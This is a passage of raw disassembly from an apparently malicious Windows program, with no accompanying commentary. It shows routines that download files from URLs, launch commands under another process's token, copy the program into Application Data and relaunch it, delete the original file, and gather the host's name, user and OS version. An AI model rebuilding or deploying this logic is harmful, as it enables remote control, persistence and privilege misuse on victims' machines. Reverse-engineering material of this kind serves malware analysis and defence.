.text:0040273F loc_40273F:             ; 16
.text:0040273F push    [ebp+Dest]
.text:00402742 call    strcat          ; 16
.text:00402747 pop     ecx             ; 16
.text:00402748 pop     ecx             ; 16
.text:00402749 push    ebx             ; 16
.text:0040274A call    ds:CloseServiceHandle ; 16
.text:00402750 jmp     short loc_402795 ; 16 Flows to: 24
.text:00402752
.text:00402752 loc_402752:             ; 17
.text:00402752 push    esi
.text:00402753 push    esi             ; 17
.text:00402754 push    edi             ; 17
.text:00402755 call    ds:StartServiceA ; 17
.text:0040275B test    eax, eax        ; 17
.text:0040275D jz      short loc_402766 ; 17 Flows to: 18, 19
.text:0040275F push    offset aServiceStarted ; 18
.text:00402764 jmp     short loc_40277F ; 18 Flows to: 22
.text:00402766
.text:00402766 loc_402766:             ; 19
.text:00402766 call    ds:GetLastError
.text:0040276C cmp     eax, 420h       ; 19
.text:00402771 jnz     short loc_40277A ; 19 Flows to: 20, 21
.text:00402773 push    offset aServiceIsRunni ; 20
.text:00402778 jmp     short loc_40277F ; 20 Flows to: 22
.text:0040277A
.text:0040277A loc_40277A:             ; 21 Flows to: 22
.text:0040277A push    offset aStartserviceFa
.text:0040277F
.text:0040277F loc_40277F:             ; 22
.text:0040277F push    [ebp+Dest]
.text:00402782 call    strcat          ; 22
.text:00402787 mov     esi, ds:CloseServiceHandle ; 22
.text:0040278D pop     ecx             ; 22
.text:0040278E pop     ecx             ; 22
.text:0040278F push    edi             ; 22
.text:00402790 call    esi ; CloseServiceHandle ; 22
.text:00402792 push    ebx             ; 22 Flows to: 23
.text:00402793
.text:00402793 loc_402793:             ; 23 Flows to: 24
.text:00402793 call    esi ; CloseHandle
.text:00402795
.text:00402795 loc_402795:             ; 24
.text:00402795 pop     edi
.text:00402796 pop     esi             ; 24
.text:00402797 pop     ebx             ; 24
.text:00402798 leave                   ; 24
.text:00402799 retn                    ; 24
.text:00402799 sub_402637 endp
.text:00402799
.text:0040279A
.text:0040279A
.text:0040279A
.text:0040279A ; int __cdecl sub_40279A(char *Dest)
.text:0040279A sub_40279A proc near
.text:0040279A
.text:0040279A Dest= dword ptr  4
.text:0040279A
.text:0040279A cmp     lpServiceName, 0 ; 1
.text:004027A1 jz      short loc_4027C7 ; 1 Flows to: 2, 4
.text:004027A3 mov     eax, Str        ; 2
.text:004027A8 test    eax, eax        ; 2
.text:004027AA jz      short loc_4027C7 ; 2 Flows to: 3, 4
.text:004027AC push    eax             ; 3
.text:004027AD call    ds:atol         ; 3
.text:004027B3 push    eax             ; 3
.text:004027B4 push    lpServiceName   ; 3
.text:004027BA push    [esp+0Ch+Dest]  ; 3
.text:004027BE call    sub_402809      ; 3
.text:004027C3 add     esp, 10h        ; 3
.text:004027C6 retn                    ; 3 Flows to: 4
.text:004027C7
.text:004027C7 loc_4027C7:             ; 4
.text:004027C7 push    offset aSyntaxError
.text:004027CC push    [esp+4+Dest]    ; 4
.text:004027D0 call    strcat          ; 4
.text:004027D5 pop     ecx             ; 4
.text:004027D6 pop     ecx             ; 4
.text:004027D7 retn                    ; 4
.text:004027D7 sub_40279A endp
.text:004027D7
.text:004027D8
.text:004027D8
.text:004027D8
.text:004027D8 ; int __cdecl sub_4027D8(char *Dest)
.text:004027D8 sub_4027D8 proc near
.text:004027D8
.text:004027D8 Dest= dword ptr  4
.text:004027D8
.text:004027D8 mov     ecx, Str        ; 1
.text:004027DE xor     edx, edx        ; 1
.text:004027E0 cmp     ecx, edx        ; 1
.text:004027E2 jz      short loc_4027F8 ; 1 Flows to: 2, 4
.text:004027E4 mov     eax, lpServiceName ; 2
.text:004027E9 cmp     eax, edx        ; 2
.text:004027EB jz      short loc_4027F8 ; 2 Flows to: 3, 4
.text:004027ED push    edx             ; 3
.text:004027EE push    edx             ; 3
.text:004027EF push    eax             ; 3
.text:004027F0 push    ecx             ; 3
.text:004027F1 push    edx             ; 3
.text:004027F2 call    URLDownloadToFileA ; 3
.text:004027F7 retn                    ; 3 Flows to: 4
.text:004027F8
.text:004027F8 loc_4027F8:             ; 4
.text:004027F8 push    offset aSyntaxErrorUsa_2
.text:004027FD push    [esp+4+Dest]    ; 4
.text:00402801 call    strcat          ; 4
.text:00402806 pop     ecx             ; 4
.text:00402807 pop     ecx             ; 4
.text:00402808 retn                    ; 4
.text:00402808 sub_4027D8 endp
.text:00402808
.text:00402809
.text:00402809
.text:00402809 ; Attributes: bp-based frame
.text:00402809
.text:00402809 ; int __cdecl sub_402809(char *, int, DWORD dwProcessId)
.text:00402809 sub_402809 proc near
.text:00402809
.text:00402809 CommandLine= byte ptr -260h
.text:00402809 Dest= byte ptr -15Ch
.text:00402809 Dst= dword ptr -5Ch
.text:00402809 var_30= dword ptr -30h
.text:00402809 var_2C= word ptr -2Ch
.text:00402809 ProcessInformation= _PROCESS_INFORMATION ptr -18h
.text:00402809 var_8= dword ptr -8
.text:00402809 TokenHandle= dword ptr -4
.text:00402809 arg_0= dword ptr  8
.text:00402809 arg_4= dword ptr  0Ch
.text:00402809 dwProcessId= dword ptr  10h
.text:00402809
.text:00402809 push    ebp             ; 1
.text:0040280A mov     ebp, esp        ; 1
.text:0040280C sub     esp, 260h       ; 1
.text:00402812 push    edi             ; 1
.text:00402813 xor     edi, edi        ; 1
.text:00402815 cmp     [ebp+dwProcessId], edi ; 1
.text:00402818 mov     [ebp+var_8], edi ; 1
.text:0040281B jnz     short loc_402825 ; 1 Flows to: 2, 3
.text:0040281D call    ds:GetCurrentProcess ; 2
.text:00402823 jmp     short loc_402834 ; 2 Flows to: 4
.text:00402825
.text:00402825 loc_402825:             ; 3
.text:00402825 push    [ebp+dwProcessId]
.text:00402828 push    edi             ; 3
.text:00402829 push    1F0FFFh         ; 3
.text:0040282E call    ds:OpenProcess  ; 3 Flows to: 4
.text:00402834
.text:00402834 loc_402834:             ; 4
.text:00402834 cmp     eax, 0FFFFFFFFh
.text:00402837 mov     [ebp+dwProcessId], eax ; 4
.text:0040283A jnz     short loc_40286E ; 4 Flows to: 5, 6
.text:0040283C call    ds:GetLastError ; 5
.text:00402842 push    eax             ; 5
.text:00402843 lea     eax, [ebp+Dest] ; 5
.text:00402849 push    offset aFailedWithD ; 5
.text:0040284E push    eax             ; 5
.text:0040284F call    ds:sprintf      ; 5
.text:00402855 lea     eax, [ebp+Dest] ; 5
.text:0040285B push    eax             ; 5
.text:0040285C push    [ebp+arg_0]     ; 5
.text:0040285F call    strcat          ; 5
.text:00402864 add     esp, 14h        ; 5
.text:00402867 xor     eax, eax        ; 5
.text:00402869 jmp     loc_40296C      ; 5 Flows to: 13
.text:0040286E
.text:0040286E loc_40286E:             ; 6
.text:0040286E lea     eax, [ebp+TokenHandle]
.text:00402871 push    esi             ; 6
.text:00402872 push    eax             ; 6
.text:00402873 push    0Bh             ; 6
.text:00402875 push    [ebp+dwProcessId] ; 6
.text:00402878 call    ds:OpenProcessToken ; 6
.text:0040287E mov     esi, ds:CloseHandle ; 6
.text:00402884 test    eax, eax        ; 6
.text:00402886 jz      loc_402938      ; 6 Flows to: 7, 11
.text:0040288C push    ebx             ; 7
.text:0040288D push    44h             ; 7
.text:0040288F pop     ebx             ; 7
.text:00402890 lea     eax, [ebp+Dst]  ; 7
.text:00402893 push    ebx             ; 7
.text:00402894 push    edi             ; 7
.text:00402895 push    eax             ; 7
.text:00402896 call    memset          ; 7
.text:0040289B push    [ebp+arg_4]     ; 7
.text:0040289E lea     eax, [ebp+CommandLine] ; 7
.text:004028A4 mov     [ebp+Dst], ebx  ; 7
.text:004028A7 mov     ebx, ds:sprintf ; 7
.text:004028AD push    offset aS_0     ; 7
.text:004028B2 push    eax             ; 7
.text:004028B3 mov     [ebp+var_30], 1 ; 7
.text:004028BA mov     [ebp+var_2C], di ; 7
.text:004028BE call    ebx ; sprintf   ; 7
.text:004028C0 add     esp, 18h        ; 7
.text:004028C3 lea     eax, [ebp+ProcessInformation] ; 7
.text:004028C6 push    eax             ; 7
.text:004028C7 lea     eax, [ebp+Dst]  ; 7
.text:004028CA push    eax             ; 7
.text:004028CB push    edi             ; 7
.text:004028CC push    edi             ; 7
.text:004028CD push    edi             ; 7
.text:004028CE push    1               ; 7
.text:004028D0 push    edi             ; 7
.text:004028D1 lea     eax, [ebp+CommandLine] ; 7
.text:004028D7 push    edi             ; 7
.text:004028D8 push    eax             ; 7
.text:004028D9 push    edi             ; 7
.text:004028DA push    [ebp+TokenHandle] ; 7
.text:004028DD call    ds:CreateProcessAsUserA ; 7
.text:004028E3 test    eax, eax        ; 7
.text:004028E5 jz      short loc_402909 ; 7 Flows to: 8, 9
.text:004028E7 push    offset aOk_0    ; 8
.text:004028EC push    [ebp+arg_0]     ; 8
.text:004028EF call    strcat          ; 8
.text:004028F4 pop     ecx             ; 8
.text:004028F5 pop     ecx             ; 8
.text:004028F6 push    [ebp+ProcessInformation.hProcess] ; 8
.text:004028F9 call    esi ; CloseHandle ; 8
.text:004028FB push    [ebp+ProcessInformation.hThread] ; 8
.text:004028FE call    esi ; CloseHandle ; 8
.text:00402900 mov     [ebp+var_8], 1  ; 8
.text:00402907 jmp     short loc_402930 ; 8 Flows to: 10
.text:00402909
.text:00402909 loc_402909:             ; 9
.text:00402909 call    ds:GetLastError
.text:0040290F push    eax             ; 9
.text:00402910 lea     eax, [ebp+Dest] ; 9
.text:00402916 push    offset aCreateFailedWi ; 9
.text:0040291B push    eax             ; 9
.text:0040291C call    ebx ; sprintf   ; 9
.text:0040291E lea     eax, [ebp+Dest] ; 9
.text:00402924 push    eax             ; 9
.text:00402925 push    [ebp+arg_0]     ; 9
.text:00402928 call    strcat          ; 9
.text:0040292D add     esp, 14h        ; 9 Flows to: 10
.text:00402930
.text:00402930 loc_402930:             ; 10
.text:00402930 push    [ebp+TokenHandle]
.text:00402933 call    esi ; CloseHandle ; 10
.text:00402935 pop     ebx             ; 10
.text:00402936 jmp     short loc_402963 ; 10 Flows to: 12
.text:00402938
.text:00402938 loc_402938:             ; 11
.text:00402938 call    ds:GetLastError
.text:0040293E push    eax             ; 11
.text:0040293F lea     eax, [ebp+Dest] ; 11
.text:00402945 push    offset aFailedWithD ; 11
.text:0040294A push    eax             ; 11
.text:0040294B call    ds:sprintf      ; 11
.text:00402951 lea     eax, [ebp+Dest] ; 11
.text:00402957 push    eax             ; 11
.text:00402958 push    [ebp+arg_0]     ; 11
.text:0040295B call    strcat          ; 11
.text:00402960 add     esp, 14h        ; 11 Flows to: 12
.text:00402963
.text:00402963 loc_402963:             ; 12
.text:00402963 push    [ebp+dwProcessId]
.text:00402966 call    esi ; CloseHandle ; 12
.text:00402968 mov     eax, [ebp+var_8] ; 12
.text:0040296B pop     esi             ; 12 Flows to: 13
.text:0040296C
.text:0040296C loc_40296C:             ; 13
.text:0040296C pop     edi
.text:0040296D leave                   ; 13
.text:0040296E retn                    ; 13
.text:0040296E sub_402809 endp
.text:0040296E
.text:0040296F
.text:0040296F
.text:0040296F ; Attributes: bp-based frame
.text:0040296F
.text:0040296F ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
.text:0040296F _WinMain@16 proc near
.text:0040296F
.text:0040296F Dst= dword ptr -4Ch
.text:0040296F var_44= dword ptr -44h
.text:0040296F var_38= dword ptr -38h
.text:0040296F var_24= dword ptr -24h
.text:0040296F Msg= tagMSG ptr -1Ch
.text:0040296F hInstance= dword ptr  8
.text:0040296F hPrevInstance= dword ptr  0Ch
.text:0040296F lpCmdLine= dword ptr  10h
.text:0040296F nShowCmd= dword ptr  14h
.text:0040296F
.text:0040296F push    ebp             ; 1
.text:00402970 mov     ebp, esp        ; 1
.text:00402972 sub     esp, 4Ch        ; 1
.text:00402975 push    ebx             ; 1
.text:00402976 push    esi             ; 1
.text:00402977 push    edi             ; 1
.text:00402978 call    sub_402BB0      ; 1
.text:0040297D test    eax, eax        ; 1
.text:0040297F jz      short loc_40298C ; 1 Flows to: 2, 4
.text:00402981 call    sub_402AB5      ; 2
.text:00402986 test    eax, eax        ; 2
.text:00402988 jz      short loc_4029A0 ; 2 Flows to: 3, 5
.text:0040298A jmp     short loc_4029DA ; 3 Flows to: 6
.text:0040298C
.text:0040298C loc_40298C:             ; 4
.text:0040298C push    3E8h
.text:00402991 call    ds:Sleep        ; 4
.text:00402997 push    [ebp+lpCmdLine] ; 4
.text:0040299A call    ds:DeleteFileA  ; 4 Flows to: 5
.text:004029A0
.text:004029A0 loc_4029A0:             ; 5
.text:004029A0 push    30h
.text:004029A2 xor     esi, esi        ; 5
.text:004029A4 pop     edi             ; 5
.text:004029A5 lea     eax, [ebp+Dst]  ; 5
.text:004029A8 push    edi             ; 5
.text:004029A9 push    esi             ; 5
.text:004029AA push    eax             ; 5
.text:004029AB call    memset          ; 5
.text:004029B0 mov     ebx, [ebp+hInstance] ; 5
.text:004029B3 add     esp, 0Ch        ; 5
.text:004029B6 mov     [ebp+Dst], edi  ; 5
.text:004029B9 lea     eax, [ebp+Dst]  ; 5
.text:004029BC mov     edi, offset ClassName ; 5
.text:004029C1 push    eax             ; 5
.text:004029C2 mov     [ebp+var_44], offset sub_402A58 ; 5
.text:004029C9 mov     [ebp+var_38], ebx ; 5
.text:004029CC mov     [ebp+var_24], edi ; 5
.text:004029CF call    ds:RegisterClassExA ; 5
.text:004029D5 test    ax, ax          ; 5
.text:004029D8 jnz     short loc_4029DE ; 5 Flows to: 6, 7
.text:004029DA
.text:004029DA loc_4029DA:             ; 6
.text:004029DA xor     eax, eax
.text:004029DC jmp     short loc_402A51 ; 6 Flows to: 13
.text:004029DE
.text:004029DE loc_4029DE:             ; 7
.text:004029DE push    esi
.text:004029DF push    ebx             ; 7
.text:004029E0 push    esi             ; 7
.text:004029E1 mov     eax, 80000000h  ; 7
.text:004029E6 push    esi             ; 7
.text:004029E7 push    eax             ; 7
.text:004029E8 push    eax             ; 7
.text:004029E9 push    eax             ; 7
.text:004029EA push    eax             ; 7
.text:004029EB push    0CF0000h        ; 7
.text:004029F0 push    offset WindowName ; 7
.text:004029F5 push    edi             ; 7
.text:004029F6 push    esi             ; 7
.text:004029F7 call    ds:CreateWindowExA ; 7
.text:004029FD push    esi             ; 7
.text:004029FE push    esi             ; 7
.text:004029FF push    esi             ; 7
.text:00402A00 push    offset sub_402C58 ; 7
.text:00402A05 push    esi             ; 7
.text:00402A06 push    esi             ; 7
.text:00402A07 mov     hwnd, eax       ; 7
.text:00402A0C call    ds:CreateThread ; 7
.text:00402A12 push    eax             ; 7
.text:00402A13 call    ds:CloseHandle  ; 7
.text:00402A19 mov     edi, ds:GetMessageA ; 7
.text:00402A1F push    esi             ; 7
.text:00402A20 push    esi             ; 7
.text:00402A21 lea     eax, [ebp+Msg]  ; 7
.text:00402A24 push    esi             ; 7
.text:00402A25 push    eax             ; 7 Flows to: 8
.text:00402A26
.text:00402A26 loc_402A26:             ; 8
.text:00402A26 call    edi ; GetMessageA
.text:00402A28 cmp     eax, esi        ; 8
.text:00402A2A jz      short loc_402A4E ; 8 Flows to: 9, 12
.text:00402A2C cmp     eax, 0FFFFFFFFh ; 9
.text:00402A2F jz      short loc_402A45 ; 9 Flows to: 10, 11
.text:00402A31 lea     eax, [ebp+Msg]  ; 10
.text:00402A34 push    eax             ; 10
.text:00402A35 call    ds:TranslateMessage ; 10
.text:00402A3B lea     eax, [ebp+Msg]  ; 10
.text:00402A3E push    eax             ; 10
.text:00402A3F call    ds:DispatchMessageA ; 10 Flows to: 11
.text:00402A45
.text:00402A45 loc_402A45:             ; 11
.text:00402A45 push    esi
.text:00402A46 push    esi             ; 11
.text:00402A47 lea     eax, [ebp+Msg]  ; 11
.text:00402A4A push    esi             ; 11
.text:00402A4B push    eax             ; 11
.text:00402A4C jmp     short loc_402A26 ; 11 Flows to: 8
.text:00402A4E
.text:00402A4E loc_402A4E:             ; 12 Flows to: 13
.text:00402A4E mov     eax, [ebp+Msg.wParam]
.text:00402A51
.text:00402A51 loc_402A51:             ; 13
.text:00402A51 pop     edi
.text:00402A52 pop     esi             ; 13
.text:00402A53 pop     ebx             ; 13
.text:00402A54 leave                   ; 13
.text:00402A55 retn    10h             ; 13
.text:00402A55 _WinMain@16 endp
.text:00402A55
.text:00402A58
.text:00402A58
.text:00402A58 ; Attributes: bp-based frame
.text:00402A58
.text:00402A58 ; int __stdcall sub_402A58(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
.text:00402A58 sub_402A58 proc near
.text:00402A58
.text:00402A58 Filename= byte ptr -104h
.text:00402A58 hWnd= dword ptr  8
.text:00402A58 Msg= dword ptr  0Ch
.text:00402A58 wParam= dword ptr  10h
.text:00402A58 lParam= dword ptr  14h
.text:00402A58
.text:00402A58 push    ebp             ; 1
.text:00402A59 mov     ebp, esp        ; 1
.text:00402A5B sub     esp, 104h       ; 1
.text:00402A61 mov     eax, [ebp+Msg]  ; 1
.text:00402A64 push    esi             ; 1
.text:00402A65 xor     esi, esi        ; 1
.text:00402A67 dec     eax             ; 1
.text:00402A68 dec     eax             ; 1
.text:00402A69 jz      short loc_402AAE ; 1 Flows to: 2, 7
.text:00402A6B sub     eax, 0Fh        ; 2
.text:00402A6E jz      short loc_402AAB ; 2 Flows to: 3, 6
.text:00402A70 sub     eax, 5          ; 3
.text:00402A73 jz      short loc_402A89 ; 3 Flows to: 4, 5
.text:00402A75 push    [ebp+lParam]    ; 4
.text:00402A78 push    [ebp+wParam]    ; 4
.text:00402A7B push    [ebp+Msg]       ; 4
.text:00402A7E push    [ebp+hWnd]      ; 4
.text:00402A81 call    ds:DefWindowProcA ; 4
.text:00402A87 jmp     short loc_402AB0 ; 4 Flows to: 8
.text:00402A89
.text:00402A89 loc_402A89:             ; 5
.text:00402A89 lea     eax, [ebp+Filename]
.text:00402A8F push    104h            ; 5
.text:00402A94 push    eax             ; 5
.text:00402A95 push    esi             ; 5
.text:00402A96 call    ds:GetModuleFileNameA ; 5
.text:00402A9C lea     eax, [ebp+Filename] ; 5
.text:00402AA2 push    eax             ; 5
.text:00402AA3 call    sub_402E87      ; 5
.text:00402AA8 pop     ecx             ; 5
.text:00402AA9 jmp     short loc_402AAE ; 5 Flows to: 7
.text:00402AAB
.text:00402AAB loc_402AAB:             ; 6
.text:00402AAB push    1
.text:00402AAD pop     esi             ; 6 Flows to: 7
.text:00402AAE
.text:00402AAE loc_402AAE:             ; 7 Flows to: 8
.text:00402AAE mov     eax, esi
.text:00402AB0
.text:00402AB0 loc_402AB0:             ; 8
.text:00402AB0 pop     esi
.text:00402AB1 leave                   ; 8
.text:00402AB2 retn    10h             ; 8
.text:00402AB2 sub_402A58 endp
.text:00402AB2
.text:00402AB5
.text:00402AB5
.text:00402AB5 ; Attributes: bp-based frame
.text:00402AB5
.text:00402AB5 sub_402AB5 proc near
.text:00402AB5
.text:00402AB5 File= byte ptr -318h
.text:00402AB5 Filename= byte ptr -214h
.text:00402AB5 Dest= byte ptr -110h
.text:00402AB5 var_C= dword ptr -0Ch
.text:00402AB5 var_8= dword ptr -8
.text:00402AB5 TokenHandle= dword ptr -4
.text:00402AB5
.text:00402AB5 push    ebp             ; 1
.text:00402AB6 mov     ebp, esp        ; 1
.text:00402AB8 sub     esp, 318h       ; 1
.text:00402ABE push    ebx             ; 1
.text:00402ABF push    edi             ; 1
.text:00402AC0 mov     [ebp+var_8], 1  ; 1
.text:00402AC7 call    ds:GetCurrentProcess ; 1
.text:00402ACD mov     edi, eax        ; 1
.text:00402ACF lea     eax, [ebp+Filename] ; 1
.text:00402AD5 push    104h            ; 1
.text:00402ADA xor     ebx, ebx        ; 1
.text:00402ADC push    eax             ; 1
.text:00402ADD push    ebx             ; 1
.text:00402ADE call    ds:GetModuleFileNameA ; 1
.text:00402AE4 lea     eax, [ebp+TokenHandle] ; 1
.text:00402AE7 push    eax             ; 1
.text:00402AE8 push    0F01FFh         ; 1
.text:00402AED push    edi             ; 1
.text:00402AEE call    ds:OpenProcessToken ; 1
.text:00402AF4 test    eax, eax        ; 1
.text:00402AF6 jz      loc_402B9D      ; 1 Flows to: 2, 7
.text:00402AFC lea     eax, [ebp+var_C] ; 2
.text:00402AFF mov     [ebp+var_C], 104h ; 2
.text:00402B06 push    eax             ; 2
.text:00402B07 lea     eax, [ebp+Dest] ; 2
.text:00402B0D push    eax             ; 2
.text:00402B0E push    [ebp+TokenHandle] ; 2
.text:00402B11 call    ds:GetUserProfileDirectoryA ; 2
.text:00402B17 test    eax, eax        ; 2
.text:00402B19 jz      short loc_402B94 ; 2 Flows to: 3, 6
.text:00402B1B lea     eax, [ebp+Dest] ; 3
.text:00402B21 push    offset aApplicationDat ; 3
.text:00402B26 push    eax             ; 3
.text:00402B27 call    strcat          ; 3
.text:00402B2C lea     eax, [ebp+Dest] ; 3
.text:00402B32 push    eax             ; 3
.text:00402B33 lea     eax, [ebp+Filename] ; 3
.text:00402B39 push    eax             ; 3
.text:00402B3A call    sub_402DAA      ; 3
.text:00402B3F add     esp, 10h        ; 3
.text:00402B42 test    eax, eax        ; 3
.text:00402B44 jnz     short loc_402B60 ; 3 Flows to: 4, 5
.text:00402B46 lea     eax, [ebp+Filename] ; 4
.text:00402B4C push    eax             ; 4
.text:00402B4D lea     eax, [ebp+Dest] ; 4
.text:00402B53 push    eax             ; 4
.text:00402B54 call    strcpy          ; 4
.text:00402B59 pop     ecx             ; 4
.text:00402B5A mov     [ebp+var_8], ebx ; 4
.text:00402B5D pop     ecx             ; 4
.text:00402B5E jmp     short loc_402B94 ; 4 Flows to: 6
.text:00402B60
.text:00402B60 loc_402B60:             ; 5
.text:00402B60 lea     eax, [ebp+Dest]
.text:00402B66 push    eax             ; 5
.text:00402B67 lea     eax, [ebp+File] ; 5
.text:00402B6D push    offset aS_0     ; 5
.text:00402B72 push    eax             ; 5
.text:00402B73 call    ds:sprintf      ; 5
.text:00402B79 add     esp, 0Ch        ; 5
.text:00402B7C lea     eax, [ebp+Filename] ; 5
.text:00402B82 push    ebx             ; 5
.text:00402B83 push    ebx             ; 5
.text:00402B84 push    eax             ; 5
.text:00402B85 lea     eax, [ebp+File] ; 5
.text:00402B8B push    eax             ; 5
.text:00402B8C push    ebx             ; 5
.text:00402B8D push    ebx             ; 5
.text:00402B8E call    ds:ShellExecuteA ; 5 Flows to: 6
.text:00402B94
.text:00402B94 loc_402B94:             ; 6
.text:00402B94 push    [ebp+TokenHandle]
.text:00402B97 call    ds:CloseHandle  ; 6 Flows to: 7
.text:00402B9D
.text:00402B9D loc_402B9D:             ; 7
.text:00402B9D cmp     edi, 0FFFFFFFFh
.text:00402BA0 jz      short loc_402BA9 ; 7 Flows to: 8, 9
.text:00402BA2 push    edi             ; 8
.text:00402BA3 call    ds:CloseHandle  ; 8 Flows to: 9
.text:00402BA9
.text:00402BA9 loc_402BA9:             ; 9
.text:00402BA9 mov     eax, [ebp+var_8]
.text:00402BAC pop     edi             ; 9
.text:00402BAD pop     ebx             ; 9
.text:00402BAE leave                   ; 9
.text:00402BAF retn                    ; 9
.text:00402BAF sub_402AB5 endp
.text:00402BAF
.text:00402BB0
.text:00402BB0
.text:00402BB0 ; Attributes: bp-based frame
.text:00402BB0
.text:00402BB0 sub_402BB0 proc near
.text:00402BB0
.text:00402BB0 Filename= byte ptr -210h
.text:00402BB0 Dest= byte ptr -10Ch
.text:00402BB0 var_8= dword ptr -8
.text:00402BB0 TokenHandle= dword ptr -4
.text:00402BB0
.text:00402BB0 push    ebp             ; 1
.text:00402BB1 mov     ebp, esp        ; 1
.text:00402BB3 sub     esp, 210h       ; 1
.text:00402BB9 push    ebx             ; 1
.text:00402BBA push    edi             ; 1
.text:00402BBB push    1               ; 1
.text:00402BBD pop     edi             ; 1
.text:00402BBE call    ds:GetCurrentProcess ; 1
.text:00402BC4 mov     ebx, eax        ; 1
.text:00402BC6 lea     eax, [ebp+Filename] ; 1
.text:00402BCC push    104h            ; 1
.text:00402BD1 push    eax             ; 1
.text:00402BD2 push    0               ; 1
.text:00402BD4 call    ds:GetModuleFileNameA ; 1
.text:00402BDA lea     eax, [ebp+TokenHandle] ; 1
.text:00402BDD push    eax             ; 1
.text:00402BDE push    0F01FFh         ; 1
.text:00402BE3 push    ebx             ; 1
.text:00402BE4 call    ds:OpenProcessToken ; 1
.text:00402BEA test    eax, eax        ; 1
.text:00402BEC jz      short loc_402C46 ; 1 Flows to: 2, 6
.text:00402BEE lea     eax, [ebp+var_8] ; 2
.text:00402BF1 mov     [ebp+var_8], 104h ; 2
.text:00402BF8 push    eax             ; 2
.text:00402BF9 lea     eax, [ebp+Dest] ; 2
.text:00402BFF push    eax             ; 2
.text:00402C00 push    [ebp+TokenHandle] ; 2
.text:00402C03 call    ds:GetUserProfileDirectoryA ; 2
.text:00402C09 mov     edi, eax        ; 2
.text:00402C0B test    edi, edi        ; 2
.text:00402C0D jz      short loc_402C3D ; 2 Flows to: 3, 5
.text:00402C0F lea     eax, [ebp+Dest] ; 3
.text:00402C15 push    offset aApplicationDat ; 3
.text:00402C1A push    eax             ; 3
.text:00402C1B call    strcat          ; 3
.text:00402C20 lea     eax, [ebp+Dest] ; 3
.text:00402C26 push    eax             ; 3
.text:00402C27 lea     eax, [ebp+Filename] ; 3
.text:00402C2D push    eax             ; 3
.text:00402C2E call    ds:_strcmpi     ; 3
.text:00402C34 add     esp, 10h        ; 3
.text:00402C37 test    eax, eax        ; 3
.text:00402C39 jnz     short loc_402C3D ; 3 Flows to: 4, 5
.text:00402C3B xor     edi, edi        ; 4 Flows to: 5
.text:00402C3D
.text:00402C3D loc_402C3D:             ; 5
.text:00402C3D push    [ebp+TokenHandle]
.text:00402C40 call    ds:CloseHandle  ; 5 Flows to: 6
.text:00402C46
.text:00402C46 loc_402C46:             ; 6
.text:00402C46 cmp     ebx, 0FFFFFFFFh
.text:00402C49 jz      short loc_402C52 ; 6 Flows to: 7, 8
.text:00402C4B push    ebx             ; 7
.text:00402C4C call    ds:CloseHandle  ; 7 Flows to: 8
.text:00402C52
.text:00402C52 loc_402C52:             ; 8
.text:00402C52 mov     eax, edi
.text:00402C54 pop     edi             ; 8
.text:00402C55 pop     ebx             ; 8
.text:00402C56 leave                   ; 8
.text:00402C57 retn                    ; 8
.text:00402C57 sub_402BB0 endp
.text:00402C57
.text:00402C58
.text:00402C58
.text:00402C58 ; Attributes: bp-based frame
.text:00402C58
.text:00402C58 ; DWORD __stdcall sub_402C58(LPVOID lpThreadParameter)
.text:00402C58 sub_402C58 proc near
.text:00402C58
.text:00402C58 VersionInformation= _OSVERSIONINFOA ptr -0ACh
.text:00402C58 SystemTime= _SYSTEMTIME ptr -18h
.text:00402C58 hObject= dword ptr -8
.text:00402C58 nSize= dword ptr -4
.text:00402C58 lpThreadParameter= dword ptr  8
.text:00402C58
.text:00402C58 push    ebp             ; 1
.text:00402C59 mov     ebp, esp        ; 1
.text:00402C5B sub     esp, 0ACh       ; 1
.text:00402C61 push    esi             ; 1
.text:00402C62 mov     esi, 1210h      ; 1
.text:00402C67 push    edi             ; 1
.text:00402C68 push    esi             ; 1
.text:00402C69 call    ??2@YAPAXI@Z    ; 1
.text:00402C6E mov     edi, eax        ; 1
.text:00402C70 pop     ecx             ; 1
.text:00402C71 test    edi, edi        ; 1
.text:00402C73 jz      short loc_402CA5 ; 1 Flows to: 2, 4
.text:00402C75 push    esi             ; 2
.text:00402C76 push    0               ; 2
.text:00402C78 push    edi             ; 2
.text:00402C79 call    memset          ; 2
.text:00402C7E add     esp, 0Ch        ; 2
.text:00402C81 push    offset Name     ; 2
.text:00402C86 push    1               ; 2
.text:00402C88 push    0               ; 2
.text:00402C8A call    ds:CreateMutexA ; 2
.text:00402C90 cmp     eax, 0FFFFFFFFh ; 2
.text:00402C93 mov     [ebp+hObject], eax ; 2
.text:00402C96 jz      short loc_402CAC ; 2 Flows to: 3, 5
.text:00402C98 call    ds:GetLastError ; 3
.text:00402C9E cmp     eax, 0B7h       ; 3
.text:00402CA3 jnz     short loc_402CAC ; 3 Flows to: 4, 5
.text:00402CA5
.text:00402CA5 loc_402CA5:             ; 4
.text:00402CA5 xor     eax, eax
.text:00402CA7 jmp     loc_402DA4      ; 4 Flows to: 19
.text:00402CAC
.text:00402CAC loc_402CAC:             ; 5
.text:00402CAC lea     eax, [ebp+VersionInformation]
.text:00402CB2 push    ebx             ; 5
.text:00402CB3 push    eax             ; 5
.text:00402CB4 mov     [ebp+VersionInformation.dwOSVersionInfoSize], 94h ; 5
.text:00402CBE call    ds:GetVersionExA ; 5
.text:00402CC4 lea     eax, [ebp+nSize] ; 5
.text:00402CC7 lea     ebx, [edi+100h] ; 5
.text:00402CCD push    eax             ; 5
.text:00402CCE push    ebx             ; 5
.text:00402CCF mov     [ebp+nSize], 10h ; 5
.text:00402CD6 call    ds:GetComputerNameA ; 5
.text:00402CDC test    eax, eax        ; 5
.text:00402CDE mov     esi, offset aNull ; 5
.text:00402CE3 jnz     short loc_402CEE ; 5 Flows to: 6, 7
.text:00402CE5 push    esi             ; 6
.text:00402CE6 push    ebx             ; 6
.text:00402CE7 call    strcpy          ; 6
.text:00402CEC pop     ecx             ; 6
.text:00402CED pop     ecx             ; 6 Flows to: 7
.text:00402CEE
.text:00402CEE loc_402CEE:             ; 7
.text:00402CEE lea     eax, [ebp+nSize]
.text:00402CF1 mov     [ebp+nSize], 100h ; 7
.text:00402CF8 push    eax             ; 7
.text:00402CF9 push    edi             ; 7
.text:00402CFA call    ds:GetUserNameA ; 7
.text:00402D00 test    eax, eax        ; 7
.text:00402D02 jnz     short loc_402D0D ; 7 Flows to: 8, 9
.text:00402D04 push    esi             ; 8
.text:00402D05 push    edi             ; 8
.text:00402D06 call    strcpy          ; 8
.text:00402D0B pop     ecx             ; 8
